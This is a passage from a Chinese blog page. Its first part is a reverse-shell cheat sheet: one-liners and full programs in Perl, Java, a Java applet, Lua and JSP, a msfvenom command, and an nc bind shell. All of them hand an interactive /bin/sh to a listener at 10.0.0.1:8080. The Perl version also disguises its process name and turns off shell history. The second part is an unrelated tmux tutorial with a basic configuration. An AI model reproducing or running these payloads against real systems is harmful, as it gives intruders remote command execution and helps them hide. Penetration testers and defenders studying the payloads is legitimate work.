<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV&#123;"REMOTE_ADDR"&#125;)) &#123;cgiprint("Browser IP address appears to be: $ENV&#123;'</span>REMOTE_ADDR<span class="string">'&#125;");if ($auth) &#123;unless ($ENV&#123;"REMOTE_ADDR"&#125; =~ $authorised_client_pattern) &#123;cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir("/");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();&#125; else &#123;cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();&#125;open(STDIN, "&gt;&amp;SOCK");open(STDOUT,"&gt;&amp;SOCK");open(STDERR,"&gt;&amp;SOCK");$ENV&#123;"HISTFILE"&#125; = "/dev/null";system("w;uname -a;id;pwd");exec(&#123;"/bin/sh"&#125; ($fake_process_name, "-i"));sub cgiprint &#123;my $line = shift;$line .= "&lt;p&gt;\n";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;&#125;'</span></div></pre></td></tr></table></figure>
<h3 id="7、Java"><a href="#7、Java" class="headerlink" title="7、Java"></a>7、Java</h3><p>ReverseShell.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime r = Runtime.getRuntime();</div><div class="line">            Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</div><div class="line">            p.waitFor();</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：</p>
<blockquote>
<p>先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；</p>
<p>然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）</p>
<p>最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup）</p>
</blockquote>
<p>下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">import java.io.*;</div><div class="line">import java.net.Socket;</div><div class="line">import java.util.*;</div><div class="line">import java.util.regex.*;</div><div class="line">import java.applet.Applet;</div><div class="line"></div><div class="line">public class poc extends Applet&#123;</div><div class="line">    /**</div><div class="line">     * Author: daniel baier alias duddits</div><div class="line">     * Licens: GPL</div><div class="line">     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher</div><div class="line">     * Version: 0.1 alpha release</div><div class="line">     */</div><div class="line"></div><div class="line">    public String cd(String start, File currentDir) &#123;</div><div class="line">        File fullPath = new File(currentDir.getAbsolutePath());</div><div class="line">        String sparent = fullPath.getAbsoluteFile().toString();</div><div class="line">        return sparent + &quot;/&quot; + start;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    @SuppressWarnings(&quot;unchecked&quot;)</div><div class="line">    public void init() &#123;</div><div class="line">        poc rs = new poc();</div><div class="line">        PrintWriter out;</div><div class="line">        try &#123;</div><div class="line">            Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080);</div><div class="line">            out = new PrintWriter(clientSocket.getOutputStream(), true);</div><div class="line">            out.println(&quot;\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier&quot;);</div><div class="line">            boolean run = true;</div><div class="line">            String s;</div><div class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));</div><div class="line">            String startort = &quot;/&quot;;</div><div class="line">            while (run) &#123;</div><div class="line">                String z1;</div><div class="line">                File f = new File(startort);</div><div class="line">                out.println(f.getAbsolutePath() + &quot;&gt; &quot;);</div><div class="line">                s = br.readLine();</div><div class="line">                z1 = s;</div><div class="line">                Pattern pcd = Pattern.compile(&quot;^cd\\s&quot;);</div><div class="line">                Matcher mcd = pcd.matcher(z1);</div><div class="line">                String[] teile1 = pcd.split(z1);</div><div class="line">                if (s.equals(&quot;exit&quot;)) &#123;</div><div class="line">                    run = false;</div><div class="line">                &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123;</div><div class="line"></div><div class="line">                &#125; else if(mcd.find())&#123;</div><div class="line">                    try &#123;</div><div class="line">                        String cds = rs.cd(teile1[1], new File(startort));</div><div class="line">                        startort = cds;</div><div class="line">                        &#125; catch (Exception verz) &#123;</div><div class="line">                        out.println(&quot;Path &quot; + teile1[1]</div><div class="line">                        + &quot; not found.&quot;);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                &#125;else &#123;</div><div class="line"></div><div class="line">                    String z2;</div><div class="line"></div><div class="line"></div><div class="line">                    z2 = s;</div><div class="line">                    Pattern pstring = Pattern.compile(&quot;\\s&quot;);</div><div class="line">                    String[] plist = pstring.split(z2);</div><div class="line"></div><div class="line">                    try &#123;</div><div class="line"></div><div class="line">                        LinkedList slist = new LinkedList();</div><div class="line">                        for (int i = 0; i &lt; plist.length; i++) &#123;</div><div class="line">                            slist.add(plist[i]);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        ProcessBuilder builder = new ProcessBuilder(slist);</div><div class="line">                        builder.directory(new File(startort));</div><div class="line">                        Process p = builder.start();</div><div class="line">                        Scanner se = new Scanner(p.getInputStream());</div><div class="line">                        if (!se.hasNext()) &#123;</div><div class="line">                            Scanner sa = new Scanner(p.getErrorStream());</div><div class="line">                            while (sa.hasNext()) &#123;</div><div class="line">                                out.println(sa.nextLine());</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        while (se.hasNext()) &#123;</div><div class="line">                            out.println(se.nextLine());</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                    &#125; catch (Exception err) &#123;</div><div class="line">                        out.println(f.getAbsolutePath() + &quot;&gt; Command &quot;</div><div class="line">                                + s + &quot; failed!&quot;);</div><div class="line">                        out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!clientSocket.isConnected())&#123;</div><div class="line">                run = false;</div><div class="line">                out.flush();</div><div class="line">                out.close();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125; catch (Exception io) &#123;</div><div class="line">            //System.err.println(&quot;Connection refused by peer&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args)&#123;</div><div class="line">        poc p = new poc();</div><div class="line">        p.init();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>运行此程序之前，应该更改环境变量的设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; export DISPLAY=:0.0</div><div class="line">&gt; 或者</div><div class="line">&gt; setenv DISPLAY :0.0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<h3 id="8、Lua"><a href="#8、Lua" class="headerlink" title="8、Lua"></a>8、Lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure>
<p>不建议安装最新的lua，因为会出现以下问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lua: (command line):1: module &apos;socket&apos; not found:</div><div class="line">	no field package.preload[&apos;socket&apos;]</div><div class="line">	no file &apos;/usr/local/share/lua/5.2/socket.lua&apos;</div></pre></td></tr></table></figure>
<p>这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua</p>
<h3 id="9、Jsp"><a href="#9、Jsp" class="headerlink" title="9、Jsp"></a>9、Jsp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp</div></pre></td></tr></table></figure>
<p>reverse_shell.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></div><div class="line">  &#123;</div><div class="line">    InputStream zd;</div><div class="line">    OutputStream fm;</div><div class="line"></div><div class="line">    StreamConnector( InputStream zd, OutputStream fm )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">this</span>.zd = zd;</div><div class="line">      <span class="keyword">this</span>.fm = fm;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">      BufferedReader fr  = <span class="keyword">null</span>;</div><div class="line">      BufferedWriter ctw = <span class="keyword">null</span>;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        fr  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.zd ) );</div><div class="line">        ctw = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.fm ) );</div><div class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</div><div class="line">        <span class="keyword">int</span> length;</div><div class="line">        <span class="keyword">while</span>( ( length = fr.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</div><div class="line">        &#123;</div><div class="line">          ctw.write( buffer, <span class="number">0</span>, length );</div><div class="line">          ctw.flush();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>( fr != <span class="keyword">null</span> )</div><div class="line">          fr.close();</div><div class="line">        <span class="keyword">if</span>( ctw != <span class="keyword">null</span> )</div><div class="line">          ctw.close();</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    String ShellPath;</div><div class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"10.0.0.1"</span>, <span class="number">8080</span> );</div><div class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</div><div class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure>
<h3 id="10、正向shell（nc为例）"><a href="#10、正向shell（nc为例）" class="headerlink" title="10、正向shell（nc为例）"></a>10、正向shell（nc为例）</h3><p>服务器端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777 -e /bin/bash</div></pre></td></tr></table></figure>
<p>攻击端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 10.0.0.2 7777</div></pre></td></tr></table></figure>
<p>最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/tmux使用教程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/09/tmux使用教程/" itemprop="url">tmux使用教程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T17:25:01+08:00">
                2017-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tool/" itemprop="url" rel="index">
                    <span itemprop="name">tool</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="为什么要用-Tmux"><a href="#为什么要用-Tmux" class="headerlink" title="为什么要用 Tmux"></a>为什么要用 Tmux</h2><p>tmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。</p>
<p>例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我现在的项目）。或者假设你正在咖啡店里工作，需要编译一些代码，而编译要花费 2 个小时才能完成（如果是和我一起工作的话），这时你又不得不离开咖啡店。如果使用了 tmux，你就可以轻松地断开当前的会话，并于稍后方便时重新接入该会话，继续工作。</p>
<p>这真是太方便了。</p>
<p>“如何使用 tmux 才能打开多个会话，如何在会话中打开多个标签（Tab），如何在标签中打开多个窗口（Window），又如何在窗口中打开多个窗格（Pane）”，也许有些人对这些操作更感兴趣。而我很少这样做的，因为我不喜欢打开太多的——实际上是尽可能少地打开——这些东西。因此，这篇入门教程主要讲解的也是作为简单的可持久化远程会话模型的 tmux。</p>
<h3 id="远程操作计算机的生活方式"><a href="#远程操作计算机的生活方式" class="headerlink" title="远程操作计算机的生活方式"></a>远程操作计算机的生活方式</h3><p>机动性是 tmux 带给用户的最大价值。有很多开发者都是在服务器上进行所有工作的，他们只需从某处连接上服务器就可以开始工作了。有了 tmux（或者其他类似的工具），你就可以先坐在旧金山的某个咖啡店里开始在服务器上进行构建的工作，然后断开会话去赶飞机，待飞机降落到纽约市后再继续进行刚才的工作。</p>
<p>tmux 带来的另一个好处是在移动办公中，作为客户端的计算机变得不再那么重要了。只需要升级你的笔记本，然后从版本库中克隆出 vim 和 tmux 的配置文件，就可以再次回到配置最优的操作环境了。而且这一切只需要短短的几分钟。</p>
<p>总之，这些就是人们喜爱 tmux 的原因。当然即使你的生活不是四处奔波，也一样能体验到 tmux 带来的好处。</p>
<h4 id="那么-screen-呢？"><a href="#那么-screen-呢？" class="headerlink" title="那么 screen 呢？"></a>那么 screen 呢？</h4><p>问得好。tmux 和 screen 很像，但比 screen 更好。要问好在哪里，简单的回答就是虽然与 screen 的功能相同，但是 tmux 设计得更好。screen 虽然可用，但是很不稳定。</p>
<p>以下是一些 tmux 超越 screen 的地方：</p>
<ul>
<li>screen 的项目大体上已经终止了，并且代码中有大量的问题</li>
<li>tmux 是一个活跃的项目，并且其代码库经常进行更新</li>
<li>tmux 使用的是真正的客户端/服务器模型，而 screen 只是模拟了这种模型的行为</li>
<li>tmux 同时支持 emacs 和 vim 的快捷键</li>
<li>tmux 支持自动重命名窗口</li>
<li>tmux 可以高度的脚本化</li>
<li>tmux 的窗口分割功能更加先进</li>
</ul>
<p>这些优点已经足够了吧，开始使用 tmux 吧。</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>首先要告诉诸位的是 tmux 中的一个全局的快捷键开关，开关开启后就可以通过快捷键完成很多任务。</p>
<h3 id="tmux-的快捷键"><a href="#tmux-的快捷键" class="headerlink" title="tmux 的快捷键"></a>tmux 的快捷键</h3><p>tmux 默认使用 <code>Ctrl-b</code> 作为激活快捷键的开关，开关开启后就可以通过快捷键迅速调用大量的功能。下面就给出一些基本功能的调用方法：</p>
<p>首先按下</p>
<p><code>$ Ctrl-b</code></p>
<p>接下来就可以按下一些后面将会讲解的快捷键了。不过先不要着急，可以先为能方便地使用组合键 <code>Ctrl-b</code> 做一点准备。不妨在操作系统中将键盘上的 CAPSLOCK 键映射为 Ctrl 键，这样当需要按下这个组合键时，小拇指的移动就可以更加舒服了。</p>
<h3 id="运行-tmux"><a href="#运行-tmux" class="headerlink" title="运行 tmux"></a>运行 tmux</h3><p>好了，下面让我们从运行 tmux 开始。首先选择一台你希望在断开会话后依然可以重新接入的计算机（对我来说这通常是远程服务器），然后在上面运行如下的命令：</p>
<p><code>$ tmux</code></p>
<p>很简单对吧。这样就开启了一个 tmux 的会话，你可以断开这个会话并在稍后再重新接入。</p>
<h3 id="显示所有会话"><a href="#显示所有会话" class="headerlink" title="显示所有会话"></a>显示所有会话</h3><p>由于 tmux 的理念是可以开启多个会话，并且可以自由地断开会话后重新接入，为此我们需要首先能看到可用的会话。有两种方法可以实现这个目的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via shortcut (by default Ctrl-b)</div><div class="line"># 使用快捷键（默认为 Ctrl-b）</div><div class="line"> </div><div class="line">$ Ctrl-b s</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via tmux command</div><div class="line"># 使用 tmux 的子命令</div><div class="line"> </div><div class="line">$ tmux ls</div></pre></td></tr></table></figure>
<p>上面两种方法的效果相同，都可以得到类似下面的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0: 1 windows (created Thu Nov 28 06:12:52 2013) [80x24] (attached)</div></pre></td></tr></table></figure>
<h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><p>下面我们就来新建一个会话。可以使用 <code>new</code> 命令新建会话，并且该命令允许以参数的形式传递一个会话名。我的建议是在新建时要提供一个会话名以便于日后管理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux new -s session-name</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Without naming the new session (not recommended) </div><div class="line"># 新建会话但并不指定名字 (不推荐这样做) </div><div class="line"> </div><div class="line">$ tmux new</div></pre></td></tr></table></figure>
<h3 id="接入一个之前的会话"><a href="#接入一个之前的会话" class="headerlink" title="接入一个之前的会话"></a>接入一个之前的会话</h3><p>既然我们已经创建了多个带有名称的会话，那么就可以随时接入了，有几种方法可以实现接入会话：</p>
<p>可以简单地输入 <code>tmux a</code> 命令，这样可以接入第一个可用的会话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a</div></pre></td></tr></table></figure>
<p>或者可以通过参数指定一个想接入的会话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a -t session-name</div></pre></td></tr></table></figure>
<h3 id="从会话中断开"><a href="#从会话中断开" class="headerlink" title="从会话中断开"></a>从会话中断开</h3><p>可以使用 <code>detach</code> 命令断开已有的会话（因此才会有稍后重新接入会话这么一说）。</p>
<p><code>$ tmux detach</code></p>
<p>也可以使用快捷键断开会话：</p>
<p><code>$ Ctrl-b d</code></p>
<h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><p>要关闭会话的话，可以使用如下的命令，该命令和接入会话时所使用的命令很像：</p>
<p><code>$ tmux kill-session -t session-name</code></p>
<p>提示：关闭窗口时也可以使用类似的命令，只不过要把 kill-session 换成 kill-window。另外，还可以使用 tmux killall 同时关闭 tmux。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>与其他工具一样，一旦配置好了 tmux，使用起来就将会非常顺手。下面就给出几个通常需要配置的项目：</p>
<ul>
<li>tmux 的主要快捷键</li>
<li>屏幕下方的状态条</li>
<li>自定义的各种快捷键</li>
</ul>
<p>我使用了一些相当简单的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Set a Ctrl-b shortcut for reloading your tmux config</div><div class="line">#设置 Ctrl-b 快捷键，用于重新加载 tmux 的配置文件</div></pre></td></tr></table></figure>
<p>access log，error log和system log。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"> </div><div class="line"># Rename your terminals</div><div class="line"># 重命名终端</div><div class="line">set -g set-titles on</div><div class="line">set -g set-titles-string &amp;#039;#(whoami)::#h::#(curl ipecho.net/plain;echo)&amp;#039;</div><div class="line"> </div><div class="line"># Status bar customization</div><div class="line"># 自定义状态条</div><div class="line">set -g status-utf8 on</div><div class="line">set -g status-bg black</div><div class="line">set -g status-fg white</div><div class="line">set -g status-interval 5</div><div class="line">set -g status-left-length 90</div><div class="line">set -g status-right-length 60</div><div class="line">set -g status-left &amp;quot;#[fg=Green]#(whoami)#[fg=white]::#[fg=blue]</div><div class="line">(hostname -s)#[fg=white]::##[fg=yellow]#(curl ipecho.net/plain;echo)&amp;quot;</div><div class="line"> </div><div class="line">set -g status-justify left</div><div class="line">set -g status-right &amp;#039;#[fg=Cyan]#S #[fg=white]%a %d %b %R&amp;#039;</div></pre></td></tr></table></figure>
<blockquote>
<p>tmux 默认会先从 <code>/etc/tmux.conf</code> 加载系统级的配置项，然后从 <code>~/.tmux.conf</code> 加载用户级的配置项。也可以使用参数 <code>-f</code> 指定一个配置文件。——译者注</p>
</blockquote>
<p>这里有一点值得注意，我使用了 ipecho.net 而不是 icanhazip 来获取计算机当前的 IP 地址（IPv4）。虽然也有很多教程在使用 icanhazip，但是凭我的经验，ipecho.net 的速度更快，更稳定。</p>
<p>提示：如果你感兴趣，可以来<a href="https://raw.github.com/danielmiessler/tmux/master/.tmux.config" target="_blank" rel="external">这里</a>查看我使用的最新配置。</p>
<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>我平时常用的功能就是这些了。不过，我也会使用一些 tmux 中更强大的功能。</p>
